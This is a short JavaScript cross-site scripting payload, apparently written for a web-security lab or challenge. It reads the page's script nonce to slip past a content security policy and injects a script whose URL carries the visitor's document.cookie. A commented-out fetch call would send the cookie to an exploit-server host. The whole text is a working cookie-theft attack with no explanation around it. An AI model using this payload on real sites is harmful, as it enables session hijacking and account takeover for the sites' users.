(function () {

var nonce = document.getElementsByTagName('script')[0].nonce;
var script = document.createElement('script');
script.nonce = nonce;
script.src = `/web-client/ch62/color1.js?q=${document.cookie}`;
document.body.appendChild(script)

//fetch(`https://exploit-0af60037035d93bb818cc4aa011f00fc.exploit-server.net?q=${JSON.stringify(document.cookie)}`)
})()